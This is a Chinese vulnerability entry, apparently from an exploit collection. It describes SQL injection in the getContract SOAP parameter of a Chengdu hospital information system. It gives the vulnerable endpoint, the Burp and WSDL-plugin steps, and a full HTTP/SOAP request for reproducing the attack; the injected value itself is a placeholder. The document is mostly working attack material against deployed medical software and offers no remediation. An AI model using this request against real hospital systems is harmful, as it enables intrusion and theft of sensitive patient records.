# 成都信通网易医疗科技发展有限公司HIS系统getContract存在SQL注入漏洞

- **系统**：成都信通网易医疗科技发展有限公司HIS系统　|　**类型**：SQL注入　|　**CVE**：—
- **请求**：`POST /xtHisService/services/nzzManager HTTP/1.1`

**请求体 / payload**
```
1. 漏洞位置
在下列`nzzManager`接口下的`getContract`参数
/xtHisService/services
2. 使用burp抓包，使用wsdl插件解析
/xtHisService/services/nzzManager?wsdl
\[wsdler.jar]\(公众号：渗透安全HackTwo>
3. 数据包
Cookie: JSESSIONID=0A4C07C0C8A7CFF9A03AD7B586FFCBBE
SOAPAction:
Content-Type: text/xml;charset=UTF-8
Host: xx.xx.xx.xx
Content-Length: 314
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:imp="http://imp.nzz.ws.manager.cdxt.com/">
<soapenv:Header/>
<soapenv:Body>
<imp:getContract>
<!--type: string-->
<arg0>gero et</arg0>
</imp:getContract>
</soapenv:Body>
</soapenv:Envelope>
```

**其他**
- 成都信通网易医疗科技发展有限公司HIS系统getContract存在SQL注入漏洞: * 一、漏洞简介
* 二、影响版本
* 三、特征
* 四、漏洞复现
***
- 版本: * 成都信通网易医疗科技发展有限公司HIS系统（基于电子病历的医院信息化平台）